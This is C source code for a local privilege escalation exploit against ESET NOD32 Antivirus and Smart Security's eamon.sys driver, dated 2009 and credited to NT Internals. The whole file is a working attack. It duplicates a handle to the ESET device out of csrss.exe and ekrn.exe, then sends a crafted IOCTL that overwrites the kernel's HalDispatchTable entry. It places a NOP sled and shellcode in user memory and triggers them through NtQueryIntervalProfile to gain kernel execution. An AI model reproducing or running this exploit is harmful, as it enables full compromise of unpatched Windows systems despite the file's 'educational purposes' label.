////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | ESET, spol. s r.o. - http://www.eset.com/                                  | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | ESET NOD32 Antivirus < 4.0.467                                             | //
// | ESET Smart Security < 4.0.467                                              | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Amon monitor - eamon.sys < 4.0.467                                         | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 25 September 2009                                                          | //
// |                                                                            | //
// | References:                                                                | //
// | ESET Smart Security & ESET NOD32 Antivirus Multiple Vulnerabilities        | //
// | NTIADV0901 - http://www.ntinternals.org/ntiadv0901/ntiadv0901.html         | //
// |                                                                            | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://www.reversemode.com/                             | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "Eamon_Exp.h"
#include "InvbShellcode.h"


#define CSRSS_NAME L"csrss.exe"
#define CSRSS_NAME_LENGTH sizeof("csrss.exe") * sizeof(WCHAR)

#define EKRN_NAME L"ekrn.exe"
#define EKRN_NAME_LENGTH sizeof("ekrn.exe") * sizeof(WCHAR)

#define PROCESS_TYPE L"Process"
#define PROCESS_TYPE_LENGTH sizeof("Process") * sizeof(WCHAR)

#define DEVICE_NAME L"\\Device\\Eamon"
#define DEVICE_NAME_LENGTH sizeof("\\Device\\Eamon") * sizeof(WCHAR)

#define EAMON_NAME "eamon.sys"
#define EAMON_NAME_LENGTH sizeof("eamon.sys")

#define DATA_SECTION_OFFSET 0x000661E0

#define IOCTL_VULNERABLE 0x88770048
#define INPUT_BUFFER_LENGTH 0x0C


NTSTATUS XxAdjustPrivileges(ULONG Privilege)
{
    NTSTATUS NtStatus;
    HANDLE TokenHandle;

    LUID Luid;
    TOKEN_PRIVILEGES TokenPrivileges;
    
    Luid.LowPart = Privilege;
    Luid.HighPart = 0;

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Luid = Luid;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


    NtStatus = NtOpenProcessToken(
                                  NtCurrentProcess(),                    // ProcessHandle
                                  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, // DesiredAccess
                                  &TokenHandle);                         // TokenHandle
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtOpenProcessToken - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtAdjustPrivilegesToken(
                                       TokenHandle,              // TokenHandle
                                       FALSE,                    // DisableAllPrivileges
                                       &TokenPrivileges,         // NewState
                                       sizeof(TOKEN_PRIVILEGES), // BufferLength
                                       (PTOKEN_PRIVILEGES)NULL,  // PreviousState
                                       0);                       // ReturnLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAdjustPrivilegesToken - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtClose(TokenHandle); // Handle

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    return STATUS_SUCCESS;
}

ULONG NTAPI XxQueryFileName(LPDWORD FileHandle)
{
	NTSTATUS NtStatus;

	IO_STATUS_BLOCK IoStatusBlock;

	UCHAR NameInformation[MAX_PATH];

	
	NtStatus = NtQueryInformationFile(
									  (HANDLE)*FileHandle,  // FileHandle
									  &IoStatusBlock,       // IoStatusBlock
									  NameInformation,      // FileInformation
									  MAX_PATH,             // FileInformationLength
									  FileNameInformation); // FileInformationClass

	return NtStatus;
}

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    ULONG i;
    ULONG AllocationSize1 = PAGE_SIZE * 64;
	ULONG AllocationSize2 = PAGE_SIZE * 4;
	ULONG AllocationSize3 = PAGE_SIZE * 2;
	ULONG CsrssUniqueProcess;
	ULONG ProcessHandleUniqueProcess;
    HANDLE CsrssHandle;
	HANDLE ProcessHandle;
    HANDLE DeviceHandle;

	HANDLE ThreadHandle;
	ULONG ThreadId;

    ULONG ImageBase;
    PVOID MappedBase;
    ULONG EamonImageBase;
    LONG Offset;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;

    ULONG ShellCodeSize = PAGE_SIZE * 4;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;
    
    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    CLIENT_ID ClientId;
    UCHAR ObjectInformation[OBJECT_NAME_LENGTH];
	PROCESS_BASIC_INFORMATION ProcessInformation;
    SYSTEM_PROCESSES *ProcessesAndThreadsInformation = NULL;
    SYSTEM_HANDLE_INFORMATION_EX *HandleInformation = NULL;
    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = NULL;
	OBJECT_TYPE_INFORMATION *TypeInformation = NULL;
    THREAD_BASIC_INFORMATION ThreadInformation;
    PUCHAR NameInformation = NULL;
    LARGE_INTEGER Interval;
    LONG InputBuffer[INPUT_BUFFER_LENGTH / 4];

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    system("cls");


	NtStatus = XxAdjustPrivileges(SE_DEBUG_PRIVILEGE);

	if(NtStatus)
		return NtStatus;

   
    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),              // ProcessHandle
                                       &ProcessesAndThreadsInformation, // BaseAddress
                                       0,                               // ZeroBits
                                       &AllocationSize1,                // AllocationSize
                                       MEM_COMMIT,                      // AllocationType
                                       PAGE_READWRITE);                 // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    HandleInformation = (PSYSTEM_HANDLE_INFORMATION_EX)((PUCHAR)(ProcessesAndThreadsInformation));
    ModuleInformation = (PSYSTEM_MODULE_INFORMATION_EX)((PUCHAR)(ProcessesAndThreadsInformation));


	NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &TypeInformation,
                                       0,
                                       &AllocationSize2,
                                       MEM_COMMIT,
                                       PAGE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }


	NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &NameInformation,
                                       0,
                                       &AllocationSize3,
                                       MEM_COMMIT,
                                       PAGE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [3] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    printf(" +----------------------------------------------------------------------------+\n");

    NtStatus = NtQuerySystemInformation(
                                        SystemProcessesAndThreadsInformation, // SystemInformationClass
                                        ProcessesAndThreadsInformation,       // SystemInformation
                                        AllocationSize1,                      // SystemInformationLength
                                        NULL);                                // ReturnLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    while(ProcessesAndThreadsInformation->NextEntryDelta)
    {
        if(ProcessesAndThreadsInformation->ProcessName.Length)
        {
            if(CSRSS_NAME_LENGTH == RtlCompareMemory(ProcessesAndThreadsInformation->ProcessName.Buffer,
			   CSRSS_NAME, CSRSS_NAME_LENGTH))
            {
                printf(" | Client Server Runtime Process (csrss.exe) ProcessId - %.4d                 |\n",
                       ProcessesAndThreadsInformation->ProcessId);

                CsrssUniqueProcess = ProcessesAndThreadsInformation->ProcessId;
            }

			if(EKRN_NAME_LENGTH == RtlCompareMemory(ProcessesAndThreadsInformation->ProcessName.Buffer,
			   EKRN_NAME, EKRN_NAME_LENGTH))
            {
                printf(" | ESET Service (ekrn.exe) ProcessId - %.4d                                   |\n",
                       ProcessesAndThreadsInformation->ProcessId);

                ProcessHandleUniqueProcess = ProcessesAndThreadsInformation->ProcessId;

				break;
            }
        }

        ProcessesAndThreadsInformation = (SYSTEM_PROCESSES *)((PUCHAR)(ProcessesAndThreadsInformation) +
										 ProcessesAndThreadsInformation->NextEntryDelta);
    }

    
	NtStatus = NtQuerySystemInformation(
                                        SystemHandleInformation,
                                        HandleInformation,
                                        AllocationSize1,
                                        NULL);
    
	if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation [2] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
    
    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = NULL;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    ClientId.UniqueProcess = (HANDLE)CsrssUniqueProcess;
    ClientId.UniqueThread = 0;

    
    NtStatus = NtOpenProcess(
                             &CsrssHandle,        // ProcessHandle
                             PROCESS_DUP_HANDLE,  // DesiredAccess
                             &ObjectAttributes,   // ObjectAttributes
                             &ClientId);          // ClientId

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtOpenProcess - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
	
	printf(" +----------------------------------------------------------------------------+\n");
	printf(" | Client Server Runtime Process (csrss.exe) Handle - %.4X                    |\n", CsrssHandle);
    

    for(i=0; i<(HandleInformation->HandleCount); i++)
    {
        if(HandleInformation->Handles[i].ProcessId == CsrssUniqueProcess)
        {
            NtStatus = NtDuplicateObject(
                                         CsrssHandle,                                    // Source
                                         (HANDLE)(HandleInformation->Handles[i].Handle), // SourceHandle
                                         NtCurrentProcess(),                             // Target
                                         &ProcessHandle,                                 // DeviceHandle
                                         0,                                              // DesiredAccess
                                         0,                                              // Attributes
                                         DUPLICATE_SAME_ACCESS);                         // Options

            if(NtStatus)
            {
                printf(" [*] NtStatus of NtDuplicateObject [1] - 0x%.8X\n", NtStatus);
                return NtStatus;
            }


            NtStatus = NtQueryObject(
                                     ProcessHandle,                        // ObjectHandle
                                     ObjectTypeInformation,                // ObjectInformationClass
                                     TypeInformation,                      // ObjectInformation
                                     sizeof(OBJECT_TYPE_INFORMATION) + 64, // ObjectInformationLength
                                     NULL);                                // ReturnLength

            if(NtStatus)
            {
                printf(" [*] NtStatus of NtQueryObject [1] - 0x%.8X\n", NtStatus);
                return NtStatus;
            }


            if(PROCESS_TYPE_LENGTH == RtlCompareMemory(TypeInformation->Name.Buffer,
               PROCESS_TYPE, PROCESS_TYPE_LENGTH))
            {
				NtStatus = NtQueryInformationProcess(
													 ProcessHandle,                     // ProcessHandle
													 ProcessBasicInformation,           // ProcessInformationClass
													 &ProcessInformation,               // ProcessInformation
													 sizeof(PROCESS_BASIC_INFORMATION), // ProcessInformationLength
					                                 NULL);                             // ReturnLength

				if(NtStatus)
			    {
					printf(" [*] NtStatus of NtQueryInformationProcess - 0x%.8X\n", NtStatus);
					return NtStatus;
				}

				if(ProcessInformation.UniqueProcessId == ProcessHandleUniqueProcess)
				{
					printf(" | ESET Service (ekrn.exe) Handle - 0x%.4X                                    |\n"
					       " | ESET Service (ekrn.exe) Object - 0x%.8X				      |\n"
                           " +----------------------------------------------------------------------------+\n",
                           HandleInformation->Handles[i].Handle,
                           HandleInformation->Handles[i].Object);

					NtStatus = NtQuerySystemInformation(
                                                        SystemHandleInformation,
                                                        HandleInformation,
                                                        AllocationSize1,
                                                        NULL);
    
					if(NtStatus)
					{
						printf(" [*] NtStatus of NtQuerySystemInformation [2] - 0x%.8X\n", NtStatus);
						return NtStatus;
					}

    
					for(i=0; i<(HandleInformation->HandleCount); i++)
					{
						if(HandleInformation->Handles[i].ProcessId == ProcessHandleUniqueProcess)
						{
							NtStatus = NtDuplicateObject(
														 ProcessHandle,
														 (HANDLE)(HandleInformation->Handles[i].Handle),
														 NtCurrentProcess(),
														 &DeviceHandle,
														 0,
														 0,
														 DUPLICATE_SAME_ACCESS | DUPLICATE_SAME_ATTRIBUTES);


							ThreadHandle = CreateThread(
														NULL,
														0,
														(LPTHREAD_START_ROUTINE)XxQueryFileName,
														(LPDWORD)&DeviceHandle,
														0,
														&ThreadId);

							if(WaitForSingleObjectEx(ThreadHandle, 500, FALSE) == WAIT_TIMEOUT)	
								TerminateThread(ThreadHandle, 0);
							else
							{
								RtlFillMemory(ObjectInformation, 0, OBJECT_NAME_LENGTH);


								NtStatus = NtQueryObject(
														 DeviceHandle,
														 ObjectNameInformation,
														 ObjectInformation,
														 OBJECT_NAME_LENGTH,
														 NULL);

								if(NtStatus == STATUS_OBJECT_PATH_INVALID) // ;)
								{
								    if(DEVICE_NAME_LENGTH == RtlCompareMemory(((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Buffer,
									   DEVICE_NAME, DEVICE_NAME_LENGTH))
								    {
                                        printf(" | DeviceName - %ws                                                 |\n"
                                               " | DeviceHandle - 0x%.4X                                                      |\n"
                                               " | DeviceObject - 0x%.8X                                                  |\n"
                                               " +----------------------------------------------------------------------------+\n",
                                               ((POBJECT_NAME_INFORMATION)ObjectInformation)->Name.Buffer,
                                               DeviceHandle,
                                               HandleInformation->Handles[i].Object);

                                        break;

                                    }
								}
                                
								NtStatus = NtClose(DeviceHandle);
							}
						}
					}
				}				
            }
        }

        NtStatus = NtClose(ProcessHandle);
	}


	NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &TypeInformation,   // BaseAddress
                                   &AllocationSize2,   // FreeSize
                                   MEM_DECOMMIT);      // FreeType
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(),
                                   &NameInformation,
                                   &AllocationSize3,
                                   MEM_DECOMMIT);
            
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [2] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
	
    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation,
                                        ModuleInformation,
                                        AllocationSize1,
                                        NULL);
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation [3] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
        
    ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);


    RtlMoveMemory(
                  ImageName,
                  (PVOID)(ModuleInformation->Modules[0].ImageName +
                  ModuleInformation->Modules[0].ModuleNameOffset),
                  KERNEL_NAME_LENGTH);

    printf( " +----------------------------------------------------------------------------+\n"
            " | ImageBase - 0x%.8X                                                     |\n"
            " | ImageName - %s                                                   |\n",
            ImageBase,
            ImageName);

    for(i=0; i<(ModuleInformation->ModulesCount); i++)
    {
        if(EAMON_NAME_LENGTH == RtlCompareMemory((PVOID)(ModuleInformation->Modules[i].ImageName +
           ModuleInformation->Modules[i].ModuleNameOffset), EAMON_NAME, EAMON_NAME_LENGTH))
        {
            EamonImageBase = (ULONG)ModuleInformation->Modules[i].Base;

            break;
        }
    }

    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &ModuleInformation, // BaseAddress
                                   &AllocationSize1,   // FreeSize
                                   MEM_DECOMMIT);      // FreeType

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [3] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }


    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


    NtStatus = LdrLoadDll(
                          NULL,                // DllPath
                          &DllCharacteristics, // DllCharacteristics
                          &DllName,            // DllName
                          &MappedBase);        // DllHandle

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrLoadDll - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }


    RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,          // DllHandle
                                      &ProcedureName,             // ProcedureName
                                      0,                          // ProcedureNumber OPTIONAL
                                      (PVOID*)&HalDispatchTable); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)HalDispatchTable -= (ULONG)MappedBase;
    (ULONG)HalDispatchTable += ImageBase;

    (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);


    printf( " |                                                                            |\n"
            " | HalDispatchTable - 0x%.8X                                              |\n"
            " | xHalQuerySystemInformation - 0x%.8X                                    |\n"
            " +----------------------------------------------------------------------------+\n",
            HalDispatchTable,
            xHalQuerySystemInformation);


    NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

	if(NtStatus)
	{
		printf(" [*] NtStatus of XxInitInbv - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

    RtlFreeUnicodeString(&DllName);
    RtlFreeAnsiString(&ProcedureName);

    LdrUnloadDll((PVOID)MappedBase);

    ///////////////////////////////////////////////////////////////////////////////////////////////

	NtStatus = NtQueryInformationThread(
										NtCurrentThread(),                // ThreadHandle
										0,                                // ThreadInformationClass
										&ThreadInformation,               // ThreadInformation
										sizeof(THREAD_BASIC_INFORMATION), // ThreadInformationLLength
										NULL);                            // ReturnLength

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtQueryInformationThread - 0x%.8X\n", NtStatus);
        return NtStatus;
	}


    Offset = ((LONG)((ULONG)xHalQuerySystemInformation - (EamonImageBase + DATA_SECTION_OFFSET)) / sizeof(ULONG));

	printf(" +----------------------------------------------------------------------------+\n"
           " | Current UniqueThead - 0x%.4X                                               |\n"
           " | eamon.sys ImageBase - 0x%.8X                                           |\n"
           " | MemoryOffset - 0x%.8X                                                  |\n"
           " +----------------------------------------------------------------------------+\n\n",
            ThreadInformation.ClientId.UniqueThread,
            EamonImageBase,
            Offset);


    InputBuffer[0] = Offset;
    InputBuffer[1] = Offset;
    InputBuffer[2] = Offset;


	NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,
                                     NULL,
                                     NULL,
                                     NULL,
                                     &IoStatusBlock,
                                     IOCTL_VULNERABLE,
                                     InputBuffer,
                                     INPUT_BUFFER_LENGTH,
                                     InputBuffer,
                                     INPUT_BUFFER_LENGTH);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    ShellCodeAddress = (PVOID)sizeof(ULONG);


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &ShellCodeAddress,
                                       0,
                                       &ShellCodeSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [4] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    
    RtlFillMemory(
                  ShellCodeAddress,
                  0x90,
                  ShellCodeSize);

    
    RtlMoveMemory(
                  (PVOID)((ULONG)ShellCodeAddress + (ULONG)ThreadInformation.ClientId.UniqueThread),
                  (PVOID)InbvShellCode,
                  PAGE_SIZE);


    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf(" 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" Hoop\n\n");
    NtDelayExecution(FALSE, &Interval);


    system("pause");


    NtStatus = NtQueryIntervalProfile(
                                      ProfileTotalIssues, // Source
                                      NULL);              // Interval

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQueryIntervalProfile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
    

    NtStatus = NtClose(DeviceHandle);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}